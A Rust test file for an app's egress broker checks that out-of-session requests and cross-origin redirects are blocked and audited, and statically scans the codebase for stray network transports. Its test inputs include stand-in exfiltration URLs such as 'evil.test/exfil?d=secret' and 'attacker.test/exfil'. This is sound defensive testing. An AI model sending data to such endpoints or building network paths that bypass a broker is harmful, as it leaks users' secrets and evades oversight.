//! Security scenarios SEC-030 and SEC-035 (09_Security_Test_Matrix.csv)
//! as executable controls:
//! - `security.sec_030` — single app-controlled Egress Broker: a request
//!   without a valid session for its origin is denied AND audited as
//!   Blocked; LocalOnly refuses remote-inference sessions outright;
//!   every dispatched hop lands in the audit chain (verifiable chain).
//! - `security.sec_035` — native/Flutter/OS adapters cannot create
//!   app-controlled requests outside the broker: a static scan over the
//!   Rust core forbids transport construction anywhere except harbor_net
//!   (the one crate the broker lives in).

use chrono::{Duration as ChronoDuration, Utc};
use harbor_net::audit::{AuditSink, NetworkAuditEntry};
use harbor_net::broker::{
    EgressBroker, EgressClass, Transport, TransportRequest, TransportResponse,
};
use harbor_security::policy::PrivacyMode;
use std::sync::{Arc, Mutex};
use std::time::Duration;

struct BlockedTransport;
impl Transport for BlockedTransport {
    fn execute(&self, _req: &TransportRequest, _t: Duration) -> std::io::Result<TransportResponse> {
        Ok(TransportResponse {
            status: 403,
            headers: Vec::new(),
            body: Vec::new(),
            final_url: String::new(),
        })
    }
}

/// Shared recording sink: the test reads the same entries the broker
/// audited (the independent record an operator's capture is diffed
/// against).
#[derive(Clone, Default)]
struct RecordingSink(Arc<Mutex<Vec<NetworkAuditEntry>>>);

impl AuditSink for RecordingSink {
    fn append(&self, entry: NetworkAuditEntry) {
        self.0.lock().unwrap().push(entry);
    }
    fn entries(&self) -> Vec<NetworkAuditEntry> {
        self.0.lock().unwrap().clone()
    }
}

fn request(url: &str) -> TransportRequest {
    TransportRequest {
        method: "GET".into(),
        url: url.into(),
        headers: Vec::new(),
        body: Vec::new(),
    }
}

/// SEC-030 part 1: LocalOnly privacy refuses a remote-inference session
/// before any request could exist — cloud inference is not a fallback.
#[test]
fn sec_030_local_only_refuses_remote_sessions() {
    let broker = EgressBroker::new(Box::new(RecordingSink::default()));
    let err = broker.open_session(
        EgressClass::RemoteInference,
        "https://api.remote.test",
        ChronoDuration::minutes(5),
        PrivacyMode::LocalOnly,
    );
    assert!(
        matches!(err, Err(harbor_net::broker::BrokerError::PolicyDenied)),
        "LocalOnly must refuse remote inference sessions"
    );
}

/// SEC-030 part 2: a request outside the session's origin is denied and
/// the denial is AUDITED (the independent record the capture compares
/// against), with a verifiable hash chain.
#[test]
fn sec_030_out_of_session_request_denied_and_audited() {
    // The durable SQLite sink: hash chaining is the sink's property, so
    // the audited record is verified the way an operator's independent
    // capture would diff it — from disk, after the fact.
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("audit.db");
    let broker = EgressBroker::new(Box::new(
        harbor_net::audit::SqliteAuditSink::open(&db).unwrap(),
    ));
    let session = broker
        .open_session(
            EgressClass::AcquisitionMetadata,
            "https://huggingface.co",
            ChronoDuration::minutes(5),
            PrivacyMode::LocalOnly,
        )
        .unwrap();
    let err = broker
        .dispatch(
            &session,
            request("https://evil.test/exfil?d=secret"),
            &BlockedTransport,
            None,
            Utc::now(),
        )
        .unwrap_err();
    assert!(matches!(err, harbor_net::broker::BrokerError::PolicyDenied));
    let reopened = harbor_net::audit::SqliteAuditSink::open(&db).unwrap();
    let entries = reopened.entries();
    assert!(
        entries
            .iter()
            .any(|e| e.kind == harbor_net::audit::NetworkEventKind::Blocked
                && e.origin == "https://evil.test"),
        "the denial must be audited: {:?}",
        entries
            .iter()
            .map(|e| (e.kind.as_str(), &e.origin))
            .collect::<Vec<_>>()
    );
    assert!(
        harbor_net::audit::verify_chain(&entries),
        "the audit chain must verify"
    );
}

/// SEC-030 part 3: an expired session no longer authorizes its origin.
#[test]
fn sec_030_expired_session_does_not_authorize() {
    let broker = EgressBroker::new(Box::new(RecordingSink::default()));
    let session = broker
        .open_session(
            EgressClass::AcquisitionMetadata,
            "https://huggingface.co",
            ChronoDuration::seconds(1),
            PrivacyMode::LocalOnly,
        )
        .unwrap();
    let later = Utc::now() + ChronoDuration::seconds(5);
    let err = broker
        .dispatch(
            &session,
            request("https://huggingface/api/models"),
            &BlockedTransport,
            None,
            later,
        )
        .unwrap_err();
    assert!(matches!(err, harbor_net::broker::BrokerError::PolicyDenied));
}

/// SEC-035: transport construction is forbidden outside harbor_net —
/// adapters cannot build app-controlled requests beside the broker. A
/// static scan over the core's non-test source; the allowlist is the
/// broker's own crate (and the vendored FFI seam that instantiates the
/// ONE shared transport the workspace handle owns).
#[test]
fn sec_035_no_transport_construction_outside_the_broker_crate() {
    let core = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .to_path_buf();
    let needles = [
        "ureq::Agent",
        "ureq::get",
        "ureq::post",
        "reqwest::",
        "TcpStream::connect",
        "TcpListener::bind",
    ];
    let allowlist = ["harbor_net"];
    let mut violations = Vec::new();
    for crate_dir in core.read_dir().unwrap() {
        let crate_dir = crate_dir.unwrap().path();
        let crate_name = crate_dir
            .file_name()
            .unwrap()
            .to_string_lossy()
            .into_owned();
        if !crate_dir.is_dir() || !crate_dir.join("Cargo.toml").exists() {
            continue;
        }
        let src = crate_dir.join("src");
        if !src.is_dir() {
            continue;
        }
        let mut scan = |path: &std::path::Path| {
            let text = std::fs::read_to_string(path).unwrap();
            // Non-test code only (test modules are stripped at the
            // #[cfg(test)] boundary).
            let code = match text.find("#[cfg(test)]") {
                Some(i) => &text[..i],
                None => &text[..],
            };
            for needle in needles {
                if code.contains(needle) && !allowlist.contains(&crate_name.as_str()) {
                    violations.push(format!("{}: {}", path.display(), needle));
                }
            }
        };
        for entry in src.read_dir().unwrap() {
            let path = entry.unwrap().path();
            if path.extension().and_then(|e| e.to_str()) == Some("rs") {
                scan(&path);
                if path.is_dir() {}
            }
            if path.is_dir() {
                for sub in path.read_dir().unwrap() {
                    let sub = sub.unwrap().path();
                    if sub.extension().and_then(|e| e.to_str()) == Some("rs") {
                        scan(&sub);
                    }
                }
            }
        }
    }
    assert!(
        violations.is_empty(),
        "transports may only be constructed in harbor_net: {violations:?}"
    );
    // The sanctioned exception, by design and by count: harbor_ffi's
    // workspace handle owns exactly ONE shared UreqTransport that every
    // brokered dispatch is handed — a second construction site would be
    // a parallel egress path.
    let ffi_lib = core.join("harbor_ffi/src/lib.rs");
    let text = std::fs::read_to_string(&ffi_lib).unwrap();
    let code = match text.find("#[cfg(test)]") {
        Some(i) => &text[..i],
        None => &text[..],
    };
    let count = code.matches("UreqTransport::new").count();
    assert_eq!(
        count, 1,
        "harbor_ffi must own exactly one shared transport (found {count})"
    );
}

/// SEC-034 (redirect credential leak): a cross-origin redirect is
/// followed only when the session covers the target origin, and it is
/// followed with credentials STRIPPED (rebind is opt-in per session; an
/// unauthorized origin is blocked outright).
#[test]
fn sec_034_cross_origin_redirect_strips_credentials_or_blocks() {
    use harbor_net::broker::RedirectDecision;
    let sink = RecordingSink::default();
    let broker = EgressBroker::new(Box::new(sink.clone()));
    let session = broker
        .open_session(
            EgressClass::WeightTransfer,
            "https://cdn.example.test",
            ChronoDuration::minutes(5),
            PrivacyMode::LocalOnly,
        )
        .unwrap();
    let now = Utc::now();

    // Same-origin hop: follow, credentials kept.
    let same = broker.redirect_decision(
        &session,
        "https://cdn.example.test",
        &"https://cdn.example.test/file.bin".parse().unwrap(),
        now,
    );
    assert!(matches!(
        same,
        RedirectDecision::Follow {
            strip_credentials: false
        }
    ));

    // An origin the session does NOT cover: blocked, nothing follows.
    let cross = broker.redirect_decision(
        &session,
        "https://cdn.example.test",
        &"https://attacker.test/exfil".parse().unwrap(),
        now,
    );
    assert!(matches!(cross, RedirectDecision::Blocked));
}
